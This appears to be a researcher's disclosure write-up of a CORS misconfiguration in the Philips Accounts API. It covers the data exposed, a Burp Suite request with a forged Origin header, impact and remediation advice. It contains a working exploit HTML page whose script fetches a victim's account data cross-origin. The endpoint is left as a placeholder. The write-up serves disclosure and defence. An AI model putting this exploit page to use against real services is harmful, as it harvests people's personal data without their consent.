# 🔓 Philips Accounts CORS Misconfiguration Vulnerability

## 📌 Summary

A **Cross-Origin Resource Sharing (CORS)** misconfiguration was identified in the Philips Accounts API, allowing malicious websites 🌐 to make authenticated API requests on behalf of a victim 🧑‍💻 and access sensitive personal information 🔐.

## 🛑 Vulnerability Details

The Philips accounts endpoint improperly reflects and allows requests from arbitrary origins, such as:
`Access-Control-Allow-Origin: https://www.EVIL.in`

⚠️ This insecure configuration permits **malicious websites** to make authenticated API requests from the victim’s browser and **read sensitive information**.

### 🧾 Sensitive Information Exposed
- 📧 Full name and email
- 🆔 UID and Global Subject ID
- 🗓️ Consent flags and timestamps
- 🚻 Gender and 🌍 country information
- ✅ Verified email status

## 🧪 Proof of Concept (PoC)

### 1️⃣ Request Crafted in Burp Suite 🐞
A forged `Origin` header was sent with the value `https://www.EVIL.in`.  
The server responded with `Access-Control-Allow-Origin: https://www.EVIL.in`, allowing cross-origin access.

#### 📸 Screenshot:
![IMG_9232](https://github.com/user-attachments/assets/fb1a6e0d-0fb2-4edf-88a9-3ad1b60a62a3)



### 2️⃣ Live Exploit Demonstration 💥
A crafted HTML page hosted on a malicious domain successfully retrieved the victim’s user info.

**💻 Exploit HTML:**  
```html
<!DOCTYPE html>
<html>
<head>
  <title>Philips CORS Exploit</title>
</head>
<body>
  <h2>Exploit Demo</h2>
  <button onclick="exploit()">Get Philips User Info</button>
  <pre id="output"></pre>

  <script>
    async function exploit() {
      try {
        const res = await fetch("<PHILIPS><END-POINT>", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Authorization": "Bearer <valid_token>"
          },
          body: "{}"
        });

        const data = await res.json();
        document.getElementById("output").textContent = JSON.stringify(data, null, 2);
      } catch (err) {
        document.getElementById("output").textContent = "Error: " + err;
      }
    }
  </script>
</body>
</html>
```

### 📸 Live Exploit Output:
![IMG_9233](https://github.com/user-attachments/assets/4b05d85f-f48b-44db-9dcd-a1d0cecdec8c)

## 📉 Impact

This vulnerability allows any malicious website to:
- 📤 Exfiltrate personal user information from authenticated Philips sessions.
- 📊 Conduct unauthorized data harvesting and identity profiling.
- 🚫 Bypass Same-Origin Policy protections.


## 🛠 Recommendations

- ✅ Implement a strict CORS policy allowing only trusted origins via a whitelist.
- ❌ Avoid reflecting unvalidated Origin headers.
- 🛡 Protect all sensitive endpoints with CSRF and strict CORS controls.
   🔍 Regularly audit APIs for misconfigurations.

## 🧠 What I have Learnt

Every “No” 📉 teaches us something new 📚 and pushes us to come back stronger 💪⚡

Signing off


